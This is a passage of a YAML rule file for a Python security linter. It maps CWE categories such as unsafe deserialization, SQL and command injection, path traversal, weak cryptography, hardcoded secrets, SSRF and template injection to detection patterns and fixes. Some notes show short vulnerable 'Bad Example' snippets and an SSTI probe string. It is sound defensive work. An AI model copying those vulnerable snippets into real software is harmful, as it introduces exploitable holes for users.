severity: error
message: 'CWE-502: dill.load/loads() extends pickle with same RCE vulnerabilities'
tags:
- security
- deserialization
- CWE-502
rule:
  kind: call
  pattern: dill.loads($DATA)
note: 'dill extends pickle and has the same RCE vulnerabilities. Never use with untrusted
  data.


  Fix: Use safe serialization formats.

  '
---
id: python-cwe-502-dill-load
language: python
severity: error
message: 'CWE-502: dill.load() extends pickle with same RCE vulnerabilities'
tags:
- security
- deserialization
- CWE-502
rule:
  kind: call
  pattern: dill.load($FILE)
note: 'dill.load() extends pickle with RCE vulnerabilities.


  Fix: Never use with untrusted data.

  '
---
id: python-cwe-502-cloudpickle-loads
language: python
severity: error
message: 'CWE-502: cloudpickle.loads() is vulnerable to same attacks as pickle'
tags:
- security
- deserialization
- CWE-502
rule:
  kind: call
  pattern: cloudpickle.loads($DATA)
note: 'cloudpickle is vulnerable to the same attacks as pickle due to similar serialization
  design.


  Fix: Use safe serialization formats for untrusted data.

  '
---
id: python-cwe-502-jsonpickle-decode
language: python
severity: error
message: 'CWE-502: jsonpickle.decode() can instantiate arbitrary objects enabling
  RCE'
tags:
- security
- deserialization
- CWE-502
rule:
  kind: call
  pattern: jsonpickle.decode($DATA)
note: 'jsonpickle can instantiate arbitrary objects from JSON, enabling Remote Code
  Execution.


  Fix: Use standard json.loads() for untrusted data.

  '
---
id: python-cwe-502-torch-load
language: python
severity: warning
message: 'CWE-502: torch.load() uses pickle and malicious models can execute code'
tags:
- security
- deserialization
- CWE-502
- machine-learning
rule:
  kind: call
  pattern: torch.load($FILE)
note: 'PyTorch uses pickle for model serialization. Malicious models can execute code
  on load.


  Fix: Use SafeTensors format or verify model source cryptographically.

  '
---
id: python-cwe-89-sql-format-string
language: python
severity: error
message: 'CWE-89: SQL queries with f-strings allow SQL injection attacks'
tags:
- security
- sql-injection
- CWE-89
- OWASP-A03-2021-Injection
rule:
  kind: call
  pattern: cursor.execute(f"SELECT ... {$VAR} ...")
note: "String formatting or concatenation in SQL queries allows attackers to inject\
  \ malicious SQL\nand manipulate database queries.\n\nBad Example:\n  query = f\"\
  SELECT * FROM users WHERE id = {user_id}\"\n  cursor.execute(query)\n\nFix: Use\
  \ parameterized queries:\n  cursor.execute(\"SELECT * FROM users WHERE id = ?\"\
  , (user_id,))\n\nReferences: https://realpython.com/prevent-python-sql-injection/\n"
---
id: python-cwe-89-sql-concatenation
language: python
severity: error
message: 'CWE-89: SQL queries with string concatenation allow SQL injection attacks'
tags:
- security
- sql-injection
- CWE-89
- OWASP-A03-2021-Injection
rule:
  kind: call
  pattern: cursor.execute("SELECT ... " + $VAR)
note: 'String concatenation in SQL queries enables SQL injection attacks.


  Fix: Use parameterized queries with placeholder syntax.

  '
---
id: python-cwe-89-sql-percent-format
language: python
severity: error
message: 'CWE-89: SQL queries with % formatting allow SQL injection attacks'
tags:
- security
- sql-injection
- CWE-89
- OWASP-A03-2021-Injection
rule:
  kind: call
  pattern: cursor.execute("SELECT ... %s" % $VAR)
note: 'Percent formatting for SQL queries is vulnerable to injection. The %s placeholder
  should

  be used in the execute() call, not in string formatting.


  Fix: Use parameterized queries with execute() placeholders.

  '
---
id: python-cwe-89-sqlalchemy-text-raw
language: python
severity: error
message: 'CWE-89: SQLAlchemy text() with string interpolation bypasses ORM protections'
tags:
- security
- sql-injection
- CWE-89
rule:
  kind: call
  pattern: text($RAW_SQL)
note: "SQLAlchemy's text() with string interpolation bypasses ORM protections and\
  \ enables SQL injection.\n\nFix: Use SQLAlchemy's bind parameters:\n  text(\"SELECT\
  \ * FROM users WHERE id = :id\").bindparams(id=user_id)\n"
---
id: python-cwe-89-django-raw-sql
language: python
severity: error
message: 'CWE-89: Django RawSQL or Model.objects.raw() with user input enables SQL
  injection'
tags:
- security
- sql-injection
- CWE-89
- web-framework
rule:
  kind: call
  pattern: Model.objects.raw($QUERY)
note: 'Django''s raw SQL bypasses ORM protections and is vulnerable to SQL injection
  when

  user input is not properly parameterized.


  Fix: Use ORM methods or parameterized raw queries.

  '
---
id: python-cwe-89-django-extra
language: python
severity: warning
message: 'CWE-89: Django deprecated extra() method is vulnerable to SQL injection'
tags:
- security
- sql-injection
- CWE-89
- web-framework
rule:
  kind: call
  pattern: queryset.extra(where=[...])
note: 'Django''s deprecated extra() method is vulnerable to SQL injection when where
  clause

  contains user input.


  Fix: Use annotate() or filter() with F() expressions instead.

  '
---
id: python-cwe-89-psycopg2-mogrify-execute
language: python
severity: warning
message: 'CWE-89: Incorrect use of psycopg2 mogrify can lead to SQL injection'
tags:
- security
- sql-injection
- CWE-89
rule:
  kind: call
  pattern: cursor.execute(cursor.mogrify($QUERY, $ARGS))
note: 'Incorrect use of mogrify can lead to injection if query has additional formatting

  applied after mogrify expansion.


  Fix: Use execute() with parameters directly, not mogrify() result.

  '
---
id: python-cwe-78-os-system
language: python
severity: error
message: 'CWE-78: os.system() executes commands in a shell, vulnerable to injection'
tags:
- security
- command-injection
- CWE-78
- OWASP-A03-2021-Injection
rule:
  kind: call
  pattern: os.system($CMD)
note: 'os.system() executes commands through the shell. Always vulnerable to command
  injection

  when user input is included.


  Fix: Use subprocess.run() with argument list instead.

  '
---
id: python-cwe-78-os-popen
language: python
severity: error
message: 'CWE-78: os.popen() uses shell execution and is vulnerable to injection'
tags:
- security
- command-injection
- CWE-78
- OWASP-A03-2021-Injection
rule:
  kind: call
  pattern: os.popen($CMD)
note: 'os.popen() uses shell execution and is vulnerable to command injection.


  Fix: Use subprocess.run() with capture_output=True.

  '
---
id: python-cwe-78-os-spawn
language: python
severity: warning
message: 'CWE-78: os.spawn*() functions can be vulnerable to command injection'
tags:
- security
- command-injection
- CWE-78
rule:
  kind: call
  pattern: os.spawn*($MODE, $PATH, $ARGS)
note: 'os.spawn functions can be vulnerable if arguments aren''t properly sanitized
  and shell

  interpretation occurs.


  Fix: Use subprocess module instead.

  '
---
id: python-cwe-78-commands-getoutput
language: python
severity: error
message: 'CWE-78: commands.getoutput/getstatusoutput() use shell execution (Python
  2)'
tags:
- security
- command-injection
- CWE-78
rule:
  kind: call
  pattern: commands.getoutput($CMD)
note: 'These deprecated Python 2 functions use shell execution and are vulnerable
  to injection.


  Fix: Use subprocess module instead. Upgrade to Python 3.

  '
---
id: python-cwe-78-paramiko-exec-command
language: python
severity: warning
message: 'CWE-78: paramiko ssh_client.exec_command() with user input can enable injection'
tags:
- security
- command-injection
- CWE-78
- remote-execution
rule:
  kind: call
  pattern: ssh_client.exec_command($CMD)
note: 'SSH command execution with user-controlled commands can lead to remote command
  injection

  attacks.


  Fix: Validate and sanitize command arguments. Use argument lists instead of shell
  strings.

  '
---
id: python-cwe-78-fabric-run
language: python
severity: warning
message: 'CWE-78: fabric.run() or c.run() with user input can enable command injection'
tags:
- security
- command-injection
- CWE-78
- remote-execution
rule:
  kind: call
  pattern: fabric.run($CMD)
note: 'Fabric''s run() executes shell commands remotely and is vulnerable when commands
  contain

  user input.


  Fix: Use argument validation and avoid string interpolation.

  '
---
id: python-cwe-22-path-join-absolute
language: python
severity: error
message: 'CWE-22: os.path.join() with absolute path can escape base directory'
tags:
- security
- path-traversal
- CWE-22
- OWASP-A01-2021-Broken-Access-Control
rule:
  kind: call
  pattern: os.path.join($BASE, $USER_INPUT)
note: "os.path.join() discards earlier components if any component is absolute (starts\
  \ with /).\nThis can allow attackers to escape the intended base directory.\n\n\
  Bad Example:\n  path = os.path.join(\"/uploads\", user_filename)\n  # If user_filename\
  \ is \"/etc/passwd\", path becomes \"/etc/passwd\"!\n\nFix: Use os.path.realpath()\
  \ and verify the result starts with the base directory:\n  safe_path = os.path.realpath(os.path.join(base_dir,\
  \ filename))\n  if not safe_path.startswith(os.path.realpath(base_dir)):\n     \
  \ raise ValueError(\"Invalid path\")\n\nReferences: https://www.sonarsource.com/blog/10-unknown-security-pitfalls-for-python/\n"
---
id: python-cwe-22-path-traversal-dotdot
language: python
severity: error
message: 'CWE-22: File operations with ../ sequences allow directory traversal'
tags:
- security
- path-traversal
- CWE-22
- OWASP-A01-2021-Broken-Access-Control
rule:
  kind: pattern
  pattern: '[file operations] ../ or ..\\[file operations]'
note: 'Directory traversal sequences (../ or ..\) in file paths can escape intended
  directories

  and allow attackers to read/write arbitrary files.


  Fix: Normalize paths and validate against base directory. Remove or reject ../ sequences.

  '
---
id: python-cwe-22-open-user-path
language: python
severity: warning
message: 'CWE-22: open() with user-controlled path without validation enables arbitrary
  file read'
tags:
- security
- path-traversal
- CWE-22
rule:
  kind: call
  pattern: open($USER_PATH, ...)
note: 'Opening files with user-controlled paths without validation enables arbitrary
  file read

  access.


  Fix: Validate paths are within allowed directories using realpath and startswith
  checks.

  '
---
id: python-cwe-22-pathlib-no-validation
language: python
severity: warning
message: 'CWE-22: pathlib.Path() without is_relative_to() check allows path traversal'
tags:
- security
- path-traversal
- CWE-22
rule:
  kind: call
  pattern: pathlib.Path($USER_INPUT)
note: "pathlib is safer than os.path but still requires validation against a base\
  \ directory.\n\nFix: Use is_relative_to() to validate (Python 3.9+):\n  if not resolved_path.is_relative_to(base_dir):\n\
  \      raise ValueError(\"Invalid path\")\n"
---
id: python-cwe-22-tarfile-extract
language: python
severity: error
message: 'CWE-22: tarfile.extractall/extract() vulnerable to Zip Slip via ../paths'
tags:
- security
- path-traversal
- zip-slip
- CWE-22
- archive-extraction
rule:
  kind: call
  pattern: tarfile.extractall($PATH)
note: "Tar archives can contain files with ../ in names, enabling arbitrary file write\
  \ attacks\n(Zip Slip vulnerability).\n\nFix: Validate each member's name before\
  \ extraction:\n  for member in tar.getmembers():\n      if member.name.startswith('/')\
  \ or '..' in member.name:\n          raise ValueError(\"Unsafe path in archive\"\
  )\n      tar.extract(member, path)\n"
---
id: python-cwe-22-tarfile-extract-member
language: python
severity: error
message: 'CWE-22: tarfile.extract() vulnerable to Zip Slip via ../paths'
tags:
- security
- path-traversal
- zip-slip
- CWE-22
- archive-extraction
rule:
  kind: call
  pattern: tarfile.extract($MEMBER, $PATH)
note: 'tarfile.extract() can extract to arbitrary locations if member names contain
  ../sequences.


  Fix: Validate member names before extraction.

  '
---
id: python-cwe-22-zipfile-extract
language: python
severity: warning
message: 'CWE-22: zipfile.extractall/extract() can extract to arbitrary locations'
tags:
- security
- path-traversal
- zip-slip
- CWE-22
- archive-extraction
rule:
  kind: call
  pattern: zipfile.extractall($PATH)
note: 'Zip files can contain path traversal sequences that escape the extraction directory.


  Fix: Validate member names before extraction using similar approach as tar files.

  '
---
id: python-cwe-22-zipfile-extract-member
language: python
severity: warning
message: 'CWE-22: zipfile.extract() can extract to arbitrary locations'
tags:
- security
- path-traversal
- zip-slip
- CWE-22
- archive-extraction
rule:
  kind: call
  pattern: zipfile.extract($MEMBER, $PATH)
note: 'zipfile.extract() can extract to arbitrary locations if member names are not
  validated.


  Fix: Validate member names before extraction.

  '
---
id: python-cwe-22-shutil-copy-unsafe
language: python
severity: warning
message: 'CWE-22: shutil.copy() with user-controlled paths can read/write arbitrary
  files'
tags:
- security
- path-traversal
- CWE-22
rule:
  kind: call
  pattern: shutil.copy($SRC, $DST)
note: 'File copy operations with user-controlled paths can read/write arbitrary files.


  Fix: Validate both source and destination paths using realpath and directory checks.

  '
---
id: python-cwe-327-md5-usage
language: python
severity: error
message: 'CWE-327: MD5 has known collision vulnerabilities, unsuitable for security'
tags:
- security
- cryptography
- CWE-327
- weak-hash
rule:
  kind: call
  pattern: hashlib.md5($DATA)
note: 'MD5 has known collision vulnerabilities and is unsuitable for security purposes.

  Use-case matters: error for passwords/integrity verification, warning for checksums.


  Fix: Use SHA-256 or stronger for integrity, bcrypt/argon2 for passwords.

  References: https://www.codiga.io/blog/python-insecure-hash-functions/

  '
---
id: python-cwe-327-sha1-usage
language: python
severity: error
message: 'CWE-327: SHA-1 has known collision attacks, deprecated by NIST'
tags:
- security
- cryptography
- CWE-327
- weak-hash
rule:
  kind: call
  pattern: hashlib.sha1($DATA)
note: 'SHA-1 has known collision attacks and was deprecated by NIST in 2011.

  Use-case matters: error for security purposes, warning for legacy compatibility.


  Fix: Use SHA-256 or SHA-3 instead.

  '
---
id: python-cwe-327-des-usage
language: python
severity: error
message: 'CWE-327: DES has 56-bit key (easily brute-forced), 3DES is deprecated'
tags:
- security
- cryptography
- CWE-327
- weak-encryption
rule:
  kind: call
  pattern: DES.new($KEY, ...)
note: 'DES has a 56-bit key that can be brute-forced in hours. 3DES is deprecated.


  Fix: Use AES-256 for encryption.

  '
---
id: python-cwe-327-rc4-usage
language: python
severity: error
message: 'CWE-327: RC4 has numerous known vulnerabilities'
tags:
- security
- cryptography
- CWE-327
- weak-encryption
rule:
  kind: call
  pattern: ARC4.new($KEY)
note: 'RC4 has numerous known vulnerabilities including key schedule bias and keystream
  patterns.


  Fix: Use AES-GCM or ChaCha20-Poly1305 for authenticated encryption.

  '
---
id: python-cwe-327-ecb-mode
language: python
severity: error
message: 'CWE-327: ECB mode reveals patterns in ciphertext, each block encrypted independently'
tags:
- security
- cryptography
- CWE-327
- weak-encryption
rule:
  kind: call
  pattern: AES.new($KEY, AES.MODE_ECB)
note: 'ECB (Electronic Codebook) mode reveals patterns in ciphertext because each
  plaintext

  block is encrypted independently, resulting in the same ciphertext for identical
  plaintexts.


  Fix: Use CBC, CTR, or GCM mode for encryption.

  '
---
id: python-cwe-326-weak-key-size
language: python
severity: error
message: 'CWE-326: RSA keys smaller than 2048 bits are considered weak'
tags:
- security
- cryptography
- CWE-326
- weak-key
rule:
  kind: call
  pattern: RSA.generate($BITS)
note: 'RSA keys smaller than 2048 bits are considered weak and can be factored.


  Fix: Use at least 2048-bit RSA keys (4096 bits recommended for long-term security).

  '
---
id: python-cwe-330-random-for-crypto
language: python
severity: error
message: 'CWE-330: random module is predictable, must not use for cryptographic purposes'
tags:
- security
- cryptography
- randomness
- CWE-330
rule:
  kind: call
  pattern: random.random()
note: "The random module uses Mersenne Twister PRNG which is predictable. Never use\
  \ for\ncryptographic randomness like tokens, salts, IVs, or nonces.\n\nFix: Use\
  \ secrets module:\n  import secrets\n  token = secrets.token_hex(32)\n"
---
id: python-cwe-329-static-iv
language: python
severity: error
message: 'CWE-329: Hardcoded IV/nonce breaks encryption security'
tags:
- security
- cryptography
- CWE-329
rule:
  kind: pattern
  pattern: hardcoded IV or nonce in encryption
note: 'Reusing IVs (Initialization Vectors) or nonces breaks encryption security.
  Each

  encryption operation must use a unique, random IV.


  Fix: Generate random IV for each encryption operation using secrets.token_bytes().

  '
---
id: python-cwe-916-password-md5-sha1
language: python
severity: error
message: 'CWE-916: MD5/SHA1 for passwords enables brute-force attacks'
tags:
- security
- cryptography
- password-hashing
- CWE-916
rule:
  kind: call
  pattern: hashlib.md5($PASSWORD)
note: "Fast hashes like MD5 and SHA1 are unsuitable for password storage. They enable\
  \ brute-force\nattacks because they are computationally fast.\n\nBad Example:\n\
  \  hash = hashlib.md5(password.encode()).hexdigest()\n\nFix: Use bcrypt, argon2,\
  \ or PBKDF2:\n  from passlib.hash import argon2\n  hash = argon2.hash(password)\n"
---
id: python-cwe-759-unsalted-hash
language: python
severity: error
message: 'CWE-759: Password hashing without salt is vulnerable to rainbow table attacks'
tags:
- security
- cryptography
- password-hashing
- CWE-759
rule:
  kind: pattern
  pattern: password hashing without salt
note: 'Unsalted hashes are vulnerable to rainbow table attacks where precomputed hashes
  of

  common passwords enable quick password cracking.


  Fix: Use password hashing libraries (bcrypt, argon2, PBKDF2) that handle salt automatically.

  '
---
id: python-cwe-798-hardcoded-api-key
language: python
severity: error
message: 'CWE-798: Hardcoded API keys are easily extracted from repositories'
tags:
- security
- secrets
- credentials
- CWE-798
- OWASP-A07-2021-Authentication-Failures
rule:
  kind: pattern
  pattern: api_key = "..."
note: 'API keys in source code are easily extracted from repositories by attackers
  and can

  be used to access external services.


  Fix: Use environment variables or cloud secrets managers like AWS Secrets Manager.

  '
---
id: python-cwe-798-hardcoded-token
language: python
severity: error
message: 'CWE-798: Authentication tokens should never be hardcoded'
tags:
- security
- secrets
- credentials
- CWE-798
- OWASP-A07-2021-Authentication-Failures
rule:
  kind: pattern
  pattern: token = "..."
note: 'Authentication tokens (OAuth, JWT, bearer tokens) hardcoded in source are a
  critical

  security risk and enable account takeover.


  Fix: Retrieve tokens from secure storage at runtime.

  '
---
id: python-cwe-798-aws-credentials-hardcoded
language: python
severity: error
message: 'CWE-798: AWS credentials hardcoded are frequently detected in leaks'
tags:
- security
- secrets
- credentials
- cloud-security
- CWE-798
rule:
  kind: pattern
  pattern: aws_access_key_id = "AKIA..."
note: 'AWS credentials have recognizable formats (AKIA*) and are frequently detected
  in

  repository leaks and used by attackers.


  Fix: Use IAM roles, environment variables, or AWS Secrets Manager instead.

  '
---
id: python-cwe-798-connection-string-password
language: python
severity: error
message: 'CWE-798: Connection strings with embedded passwords are commonly leaked'
tags:
- security
- secrets
- credentials
- CWE-798
rule:
  kind: pattern
  pattern: connection string with password
note: 'Database connection strings with embedded passwords are a common source of
  credential

  exposure and enable unauthorized database access.


  Fix: Use connection string parameters from environment or secrets manager.

  '
---
id: python-cwe-321-private-key-hardcoded
language: python
severity: error
message: 'CWE-321: Private keys in source code enable impersonation'
tags:
- security
- secrets
- cryptography
- CWE-321
rule:
  kind: pattern
  pattern: '-----BEGIN RSA PRIVATE KEY-----'
note: 'Private keys in source code can be extracted and used for impersonation, decryption

  of previous communications, and code signing attacks.


  Fix: Store private keys in secure files with restricted permissions (0600) or HSM/TPM.

  '
---
id: python-cwe-215-django-debug-true
language: python
severity: error
message: 'CWE-215: Django DEBUG=True exposes sensitive information in development'
tags:
- security
- web-framework
- information-disclosure
- CWE-215
- django
rule:
  kind: pattern
  pattern: DEBUG = True
note: 'Debug mode exposes sensitive information including source code paths, database
  queries,

  environment variables, and detailed error traces.


  Fix: Use DEBUG = False in production; use environment variables to control debug
  mode.

  References: https://docs.djangoproject.com/en/5.0/topics/security/

  '
---
id: python-cwe-798-django-secret-key-hardcoded
language: python
severity: error
message: 'CWE-798: Django SECRET_KEY hardcoded compromises session security'
tags:
- security
- web-framework
- secrets
- CWE-798
- django
rule:
  kind: pattern
  pattern: SECRET_KEY = "..."
note: 'Django SECRET_KEY is used for session security, CSRF tokens, and other cryptographic

  operations. Hardcoding it in source control compromises all sessions.


  Fix: Load SECRET_KEY from environment variable in settings.py.

  '
---
id: python-cwe-215-flask-debug-true
language: python
severity: error
message: 'CWE-215: Flask debug mode includes interactive debugger accessible via browser'
tags:
- security
- web-framework
- information-disclosure
- CWE-215
- flask
rule:
  kind: pattern
  pattern: app.run(debug=True)
note: 'Flask debug mode includes an interactive debugger accessible via browser that
  allows

  arbitrary code execution.


  Fix: Never enable debug mode in production.

  References: https://flask.palletsprojects.com/en/stable/web-security/

  '
---
id: python-cwe-352-csrf-disabled
language: python
severity: error
message: 'CWE-352: CSRF protection disabled or bypassed with csrf_exempt'
tags:
- security
- web-framework
- csrf
- CWE-352
- OWASP-A01-2021-Broken-Access-Control
- django
rule:
  kind: decorator
  pattern: '@csrf_exempt'
note: 'CSRF protection prevents attackers from forging requests on behalf of authenticated
  users.

  Disabling it globally exposes applications to CSRF attacks.


  Fix: Keep CSRF protection enabled. Use @csrf_exempt only for API endpoints with

  alternative authentication (like token-based auth). Better: use token-based CSRF

  validation for APIs.

  '
---
id: python-cwe-79-xss-mark-safe
language: python
severity: error
message: 'CWE-79: Django mark_safe() with user input bypasses XSS protection'
tags:
- security
- xss
- cross-site-scripting
- CWE-79
- OWASP-A03-2021-Injection
- django
rule:
  kind: call
  pattern: mark_safe($USER_INPUT)
note: "Marking user input as safe bypasses Django's automatic HTML escaping and enables\
  \ XSS attacks.\n\nBad Example:\n  return mark_safe(user_input)  # XSS vulnerability!\n\
  \nFix: Never mark user input as safe. Use proper escaping or let Django handle it.\n\
  Also avoid |safe filter in templates with untrusted data.\n"
---
id: python-cwe-79-jinja2-autoescape-false
language: python
severity: error
message: 'CWE-79: Jinja2 with autoescape=False allows XSS attacks in templates'
tags:
- security
- xss
- cross-site-scripting
- CWE-79
- OWASP-A03-2021-Injection
- template-engine
rule:
  kind: call
  pattern: Jinja2Environment(autoescape=False)
note: 'Disabling autoescape allows XSS attacks in templates where user input is rendered.


  Fix: Keep autoescape=True (default) or use select_autoescape() for selective escaping.

  '
---
id: python-cwe-918-ssrf-requests
language: python
severity: error
message: 'CWE-918: requests.get() with user URL without validation enables SSRF attacks'
tags:
- security
- ssrf
- server-side-request-forgery
- CWE-918
rule:
  kind: call
  pattern: requests.get($USER_URL)
note: "User-controlled URLs can access internal services or cloud metadata endpoints,\
  \ enabling\nServer-Side Request Forgery (SSRF) attacks.\n\nBad Example:\n  url =\
  \ request.args.get('url')\n  response = requests.get(url)  # SSRF!\n\nFix: Validate\
  \ URLs against allowlist; block private IP ranges (10.0.0.0/8, 127.0.0.0/8, etc).\n\
  References: https://www.sourcery.ai/vulnerabilities/python-flask-security-injection-ssrf-requests\n"
---
id: python-cwe-918-ssrf-urllib
language: python
severity: error
message: 'CWE-918: urllib.request.urlopen() with user URL without validation enables
  SSRF'
tags:
- security
- ssrf
- server-side-request-forgery
- CWE-918
rule:
  kind: call
  pattern: urllib.request.urlopen($USER_URL)
note: 'Same SSRF vulnerability as requests module. User-controlled URLs can access

  internal services.


  Fix: Validate URLs against allowlist.

  '
---
id: python-cwe-601-open-redirect
language: python
severity: warning
message: 'CWE-601: redirect() with user URL allows open redirect attacks'
tags:
- security
- open-redirect
- CWE-601
rule:
  kind: call
  pattern: redirect($USER_URL)
note: 'Attackers can redirect users to malicious sites using your domain, damaging
  trust

  and enabling phishing attacks.


  Fix: Only allow redirects to relative URLs or validated domain allowlist.

  '
---
id: python-cwe-614-cookie-secure-false
language: python
severity: warning
message: 'CWE-614: Cookies without Secure flag can be transmitted over HTTP'
tags:
- security
- cookies
- CWE-614
rule:
  kind: call
  pattern: response.set_cookie(..., secure=False)
note: 'Cookies without Secure flag can be transmitted over HTTP, exposing them to
  interception.


  Fix: Set secure=True for all cookies containing sensitive data. Use HTTPS-only.

  '
---
id: python-cwe-1004-cookie-httponly-false
language: python
severity: warning
message: 'CWE-1004: Cookies without HttpOnly can be accessed by JavaScript (XSS)'
tags:
- security
- cookies
- xss
- CWE-1004
rule:
  kind: call
  pattern: response.set_cookie(..., httponly=False)
note: 'Cookies without HttpOnly flag can be accessed by JavaScript, enabling session
  hijacking

  via XSS attacks.


  Fix: Set httponly=True for all session cookies to prevent JavaScript access.

  '
---
id: python-cwe-611-xxe-etree-parse
language: python
severity: warning
message: 'CWE-611: XML ElementTree parsing may be vulnerable to XXE attacks'
tags:
- security
- xxe
- xml-external-entity
- CWE-611
rule:
  kind: call
  pattern: xml.etree.ElementTree.parse($USER_INPUT)
note: "Default XML parsers may be vulnerable to XXE (XML External Entity) attacks\
  \ that can\ndisclose files, enable SSRF, or cause DoS.\n\nFix: Use defusedxml library:\n\
  \  import defusedxml.ElementTree as ET\n  tree = ET.parse(file)\n"
---
id: python-cwe-611-xxe-lxml
language: python
severity: warning
message: 'CWE-611: lxml can process external entities by default (XXE)'
tags:
- security
- xxe
- xml-external-entity
- CWE-611
rule:
  kind: call
  pattern: lxml.etree.parse($FILE)
note: 'lxml can process external entities by default, enabling XXE attacks.


  Fix: Use XMLParser(resolve_entities=False) or defusedxml.

  '
---
id: python-cwe-776-billion-laughs
language: python
severity: warning
message: 'CWE-776: XML parsing without entity expansion limits vulnerable to Billion
  Laughs'
tags:
- security
- xxe
- billion-laughs
- denial-of-service
- CWE-776
rule:
  kind: pattern
  pattern: XML parsing without entity expansion limits
note: 'Recursive entity expansion can cause Denial of Service by consuming memory
  and CPU.

  Example: Billion Laughs attack uses nested entity definitions.


  Fix: Use defusedxml or configure parser to limit entity expansion.

  '
---
id: python-cwe-94-ssti-jinja2
language: python
severity: error
message: 'CWE-94: Jinja2 Template with user input enables SSTI code execution'
tags:
- security
- ssti
- server-side-template-injection
- CWE-94
- OWASP-A03-2021-Injection
rule:
  kind: call
  pattern: Template($USER_INPUT).render()
note: "Server-Side Template Injection allows code execution via template syntax. Jinja2\
  \ templates\ncan execute arbitrary Python: {{ config.items() }}, __import__, etc.\n\
  \nBad Example:\n  template = Template(user_input)  # User can inject {{ config.items()\
  \ }}\n  result = template.render()\n\nFix: Never use user input as template source.\
  \ Use template files or safe string interpolation.\n"
---
id: python-cwe-94-ssti-mako
language: python
severity: error
message: 'CWE-94: Mako Template with user input enables SSTI code execution'
tags:
- security
- ssti
- server-side-template-injection
- CWE-94
- OWASP-A03-2021-Injection
rule:
  kind: call
  pattern: mako.template.Template($USER_INPUT)
note: 'Mako templates can execute arbitrary Python code. SSTI with Mako allows remote
  code execution.


  Fix: Don''t use user input as template source. Use pre-compiled template files.

  '
---
id: python-cwe-94-ssti-tornado
language: python
severity: error
message: 'CWE-94: Tornado Template with user input enables SSTI code execution'
tags:
- security
- ssti
- server-side-template-injection
- CWE-94
- OWASP-A03-2021-Injection
rule:
  kind: call
  pattern: tornado.template.Template($USER_INPUT)
note: 'Tornado templates support arbitrary Python expressions. SSTI allows code execution.


  Fix: Use template files, not user input as template source.

  '
---
id: python-cwe-295-ssl-unverified
language: python
severity: error
message: 'CWE-295: Disabling SSL certificate verification enables MITM attacks'
tags:
- security
- ssl-tls
- certificate-validation
- CWE-295
rule:
  kind: call
  pattern: requests.get(..., verify=False)
note: 'Disabling SSL verification (verify=False) enables man-in-the-middle attacks
  where

  attackers intercept HTTPS traffic.


  Fix: Always verify SSL certificates. Use proper CA bundles. Only disable verification

  for testing with trusted internal CAs.

  '
---
id: python-cwe-297-ssl-no-hostname-check
language: python
severity: error
message: 'CWE-297: SSL context without hostname verification accepts any valid certificate'
tags:
- security
- ssl-tls
- certificate-validation
- CWE-297
rule:
  kind: assignment
  pattern: check_hostname = False
note: 'Without hostname verification, any valid certificate (for any domain) is accepted,

  enabling MITM attacks.


  Fix: Keep hostname checking enabled (default in ssl.create_default_context()).

  '
---
id: python-cwe-319-ftplib-plain
language: python
severity: warning
message: 'CWE-319: Plain FTP transmits credentials in cleartext'
tags:
- security
- network
- cleartext-transmission
- CWE-319
rule:
  kind: call
  pattern: ftplib.FTP($HOST)
note: 'FTP transmits credentials and all data in cleartext, enabling interception
  attacks.


  Fix: Use ftplib.FTP_TLS() for secure FTP with TLS encryption.

  '
---
id: python-cwe-319-telnetlib-usage
language: python
severity: warning
message: 'CWE-319: Telnet transmits everything in cleartext'
tags:
- security
- network
- cleartext-transmission
- CWE-319
rule:
  kind: call
  pattern: telnetlib.Telnet($HOST)
note: 'Telnet transmits usernames, passwords, and all data in cleartext.


  Fix: Use SSH (paramiko library) instead of telnet.

  '
---
id: python-cwe-319-smtplib-plain
language: python
severity: warning
message: 'CWE-319: SMTP without TLS transmits emails in cleartext'
tags:
- security
- network
- cleartext-transmission
- CWE-319
rule:
  kind: call
  pattern: smtplib.SMTP($HOST)
note: 'SMTP without TLS transmits emails and credentials in cleartext.


  Fix: Use starttls() to upgrade connection or SMTP_SSL() for immediate encryption.

  '
---
id: python-cwe-732-chmod-777
language: python
severity: error
message: 'CWE-732: World-writable permissions (0o777) allow any user to modify files'
tags:
- security
- file-permissions
- CWE-732
rule:
  kind: call
  pattern: os.chmod($PATH, 0o777)
note: "World-writable permissions (777) allow any user on the system to modify files,\
  \ enabling\nprivilege escalation and data tampering.\n\nFix: Use restrictive permissions:\n\
  \  - 0o600 for sensitive files (user read/write only)\n  - 0o644 for public readable\
  \ files (user write, others read)\n  - 0o700 for directories (user read/write/execute\
  \ only)\n"
---
id: python-cwe-732-umask-permissive
language: python
severity: warning
message: 'CWE-732: Permissive umask creates files with excessive permissions'
tags:
- security
- file-permissions
- CWE-732
rule:
  kind: call
  pattern: os.umask(0o000)
note: "Permissive umask (like 0o000 or 0o002) creates files with excessive permissions,\n\
  making them world-readable or world-writable.\n\nFix: Use restrictive umask:\n \
  \ - 0o077 for sensitive files (only user access)\n  - 0o022 for general use (user\
  \ write, group/others read)\n"
---
id: python-cwe-377-tempfile-mktemp
language: python
severity: error
message: 'CWE-377: tempfile.mktemp() has race condition between file creation and
  use'
tags:
- security
- temporary-files
- race-condition
- CWE-377
rule:
  kind: call
  pattern: tempfile.mktemp()
note: 'mktemp() only returns a filename but doesn''t create the file. This creates
  a race

  condition where attackers can create symlinks to cause file overwrite.


  Fix: Use tempfile.mkstemp() or NamedTemporaryFile() which atomically create files.

  '
---
id: python-cwe-377-tmp-hardcoded
language: python
severity: warning
message: 'CWE-377: Hardcoded /tmp paths are predictable and vulnerable to symlink
  attacks'
tags:
- security
- temporary-files
- race-condition
- CWE-377
rule:
  kind: pattern
  pattern: open("/tmp/...")
note: 'Hardcoded temp paths are predictable and vulnerable to symlink attacks and
  race conditions.


  Fix: Use tempfile module for temporary files with secure creation.

  '
---
id: python-cwe-117-log-injection
language: python
severity: warning
message: 'CWE-117: Unsanitized user input in logs can inject false entries'
tags:
- security
- logging
- CWE-117
rule:
  kind: call
  pattern: logging.info($USER_INPUT)
note: 'User input in logs can inject false log entries, break log parsing, or hide
  malicious

  activity. Newlines in logs can create false entries.


  Fix: Sanitize user input; use structured logging with JSON. Use logging formatters

  to escape special characters.

  '
---
id: python-cwe-209-exception-info-leak
language: python
severity: warning
message: 'CWE-209: Returning exception details to users reveals internal structure'
tags:
- security
- error-handling
- information-disclosure
- CWE-209
rule:
  kind: pattern
  pattern: return str(e)
note: "Stack traces reveal internal structure (paths, library versions, database schemas)\
  \ and\naid attackers in finding vulnerabilities.\n\nBad Example:\n  except Exception\
  \ as e:\n      return {\"error\": str(e)}  # Exposes stack trace!\n\nFix: Log detailed\
  \ errors server-side; return generic error message to users.\n"
---
id: python-cwe-617-assert-security
language: python
severity: error
